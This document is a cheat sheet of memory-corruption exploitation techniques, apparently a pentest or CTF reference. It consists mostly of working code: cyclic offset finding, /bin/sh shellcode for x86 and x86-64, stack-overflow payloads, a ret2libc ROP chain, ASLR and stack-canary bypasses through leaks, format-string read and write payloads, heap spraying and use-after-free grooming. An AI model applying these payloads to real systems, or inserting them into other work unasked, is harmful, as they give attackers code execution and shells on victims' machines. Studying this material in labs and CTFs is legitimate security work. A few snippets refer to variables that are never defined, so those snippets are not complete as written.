# Memory Corruption Payloads — Shellcode, ROP, Heap Spray, Format Strings

## Buffer Overflow: Finding the Offset

### Generate cyclic pattern (De Bruijn sequence)
```python
# Using pwntools:
from pwn import *
pattern = cyclic(500)   # 500-byte De Bruijn pattern
print(pattern)
# Send this as input to the vulnerable program

# After crash, find offset from EIP/RIP value:
# In GDB after crash: info registers eip
# EIP = 0x61616175  → cyclic_find(0x61616175) → gives offset
offset = cyclic_find(0x61616175)
print(f"Offset: {offset}")   # e.g., 76
```

### Generate pattern with Metasploit pattern_create
```bash
# Generate 500-byte pattern
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 500

# Find offset after crash (EIP = 0x39614138 from crash info):
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x39614138
# → [*] Exact match at offset 76
```

---

## Classic Stack Overflow — x86 (32-bit)

### Without any protections (no ASLR, no NX, no stack canary)
```python
from pwn import *

# x86 Linux /bin/sh shellcode (25 bytes)
shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e"
shellcode += b"\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

# Build payload: padding + return address pointing to shellcode on stack
offset = 76          # found via cyclic pattern
ret_addr = 0xffffd5a0  # address of shellcode on stack (find with GDB: x/200x $esp)

payload = shellcode
payload += b"A" * (offset - len(shellcode))
payload += p32(ret_addr)   # overwrite saved EIP

# Deliver:
p = process('./vulnerable')
p.sendline(payload)
p.interactive()
```

### x86-64 (64-bit) without protections
```python
from pwn import *

# x86-64 /bin/sh shellcode (27 bytes)
shellcode = b"\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68"
shellcode += b"\x48\xc1\xeb\x08\x53\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05"

offset = 120
ret_addr = 0x7fffffffe4b0  # shellcode address on stack

payload = shellcode + b"A" * (offset - len(shellcode)) + p64(ret_addr)
```

---

## ROP Chain — Bypass NX/DEP

### Step 1: Check protections with checksec
```bash
checksec --file=./vulnerable
# or with pwntools:
python3 -c "from pwn import *; e=ELF('./vulnerable'); print(e.checksec())"

# Output interpretation:
# NX enabled → shellcode on stack won't execute; need ROP
# PIE disabled → binary addresses are fixed; gadgets at fixed offsets
# Stack canary → need leak before overflow
# ASLR (system-wide): check /proc/sys/kernel/randomize_va_space (0=off, 2=on)
```

### Step 2: Find ROP gadgets
```bash
# ROPgadget:
ROPgadget --binary ./vulnerable --rop --chain "execve"
ROPgadget --binary ./vulnerable | grep "pop rdi ; ret"
ROPgadget --binary ./vulnerable | grep ": ret$"

# ropper:
ropper -f ./vulnerable --search "pop rdi"
ropper -f ./vulnerable --chain "execve" --badbytes "0a"
```

### Step 3: Build ret2libc chain (x86-64)
```python
from pwn import *

elf = ELF('./vulnerable')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
rop = ROP(elf)

# Gadgets (from ROPgadget output — adjust addresses)
pop_rdi = 0x401233   # pop rdi; ret
ret     = 0x40101a   # ret (stack alignment for 64-bit)

# Libc addresses (if no ASLR / after leak)
libc_base    = 0x7ffff7a00000
system_addr  = libc_base + libc.sym['system']
bin_sh_addr  = libc_base + next(libc.search(b'/bin/sh'))

offset = 120
payload  = b"A" * offset
payload += p64(ret)          # stack alignment
payload += p64(pop_rdi)      # set RDI = "/bin/sh"
payload += p64(bin_sh_addr)
payload += p64(system_addr)  # call system("/bin/sh")

p = process('./vulnerable')
p.sendline(payload)
p.interactive()
```

### Step 4: ASLR bypass via information leak
```python
# If program leaks a libc address (e.g., prints a pointer), calculate libc base:
from pwn import *

p = process('./vulnerable')
p.recvuntil("buffer at: ")
leak = int(p.recvline().strip(), 16)

libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
# The leaked address is e.g. printf's GOT entry:
libc_base = leak - libc.sym['printf']
system_addr = libc_base + libc.sym['system']
bin_sh_addr = libc_base + next(libc.search(b'/bin/sh'))
print(f"libc base: {hex(libc_base)}")
```

---

## Format String Payloads

### Read stack values (information leak)
```
# Payload to leak first 8 stack values as hex:
%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x

# Direct parameter access (faster, less padding needed):
%1$x   → first argument
%6$x   → sixth argument (often where format string itself appears on stack)
%6$s   → sixth argument interpreted as char* (print string at that address)
```

### Finding your input offset on the stack
```python
# Send "AAAA" + %N$x and increase N until you see 0x41414141 (0x41 = 'A')
for i in range(1, 20):
    payload = f"AAAA.%{i}$x"
    # Send payload, look for 41414141 in output
    # The matching N is your format string offset
```

### Read arbitrary memory address
```python
# Once you know offset N where your input appears:
target_addr = 0x08049654   # address to read (e.g., a password on stack)
payload = p32(target_addr) + f"%{N}$s".encode()
# %N$s will dereference the pointer at offset N (your target_addr) and print the string
```

### Write arbitrary value with %n (4-byte write)
```python
# %n writes the number of bytes printed so far to the address at arg N
# To write value 0x41 (65 decimal) to address 0xdeadbeef:
target_addr = 0xdeadbeef
offset = 6   # format string offset

# Pad output to 65 bytes, then write:
payload = p32(target_addr) + f"%{65 - 4}c%{offset}$n".encode()
# 4 bytes already printed (the address), so pad 61 more = 65 total
```

### Full format string exploit with pwntools
```python
from pwn import *

p = process('./vulnerable')

# Build format string to overwrite return address or GOT entry
writes = {elf.got['exit']: elf.sym['win_function']}
payload = fmtstr_payload(6, writes)   # 6 = your format string stack offset
p.sendline(payload)
p.interactive()
```

---

## Heap Spray

### Goal
Fill heap with NOPs + shellcode so that jumping to any heap address hits the sled.

```python
from pwn import *

# x86-64 shellcode
shellcode = b"\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68"
shellcode += b"\x48\xc1\xeb\x08\x53\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05"

# NOP sled
nop = b"\x90"
chunk_size = 4096
nop_sled = nop * (chunk_size - len(shellcode))
chunk = nop_sled + shellcode

# Spray 1000 chunks
spray = chunk * 1000

# Guess address in the middle of spray (e.g., heap starts ~0x555555559000)
guess_addr = 0x555555700000   # adjust based on target

p = process('./vulnerable')
p.send(spray)   # spray the heap via whatever allocation primitive exists
# Then trigger the vulnerability with overwrite to guess_addr
```

---

## Use-After-Free Trigger Pattern

```c
// To trigger UAF in a vulnerable program:
// 1. Allocate an object of size S
// 2. Free it
// 3. Allocate another object of same size S (heap allocator recycles the chunk)
// 4. The old pointer now points to the new object's data
// 5. Use the old pointer to confuse type checker or call virtual method

// In an exploit: after free, spray heap with controlled data of same size
// This places your data at the freed address
// The use of the dangling pointer now reads attacker data as object fields
```

### Heap Grooming PoC (conceptual)
```python
# Trigger: send request to allocate victim object (size 64)
# Trigger: send request to free it
# Spray: send 100 requests each allocating 64-byte controlled data
# Trigger: send request that uses the dangling pointer
# The controlled 64-byte data is now read as the victim object
# → overwrite function pointer or type tag to redirect execution
```

---

## Stack Canary Bypass via Format String Leak

```python
from pwn import *

p = process('./vulnerable_with_canary')

# Step 1: Use format string vulnerability to leak canary
# Canary is typically at a fixed offset from the format string on stack
# Find canary offset by trial:
for i in range(1, 30):
    p.sendline(f"%{i}$p".encode())
    leak = p.recvline()
    # Canary looks like: 0x????????00 (ends in 00 on Linux)
    if b"0x" in leak and leak.strip().endswith(b"00"):
        print(f"Canary at offset {i}: {leak.strip()}")

# Step 2: Build BOF payload including the leaked canary
canary = 0xABCD1234EF000000   # replace with actual leaked value
offset_to_canary = 72          # bytes until canary location
offset_to_rip    = 80          # bytes from canary to saved RIP

payload  = b"A" * offset_to_canary
payload += p64(canary)                    # preserve canary
payload += b"B" * (offset_to_rip - 8)    # padding to saved RBP
payload += p64(0x41414141)               # overwrite saved RIP / RBP as needed
payload += p64(system_addr)               # return address
```
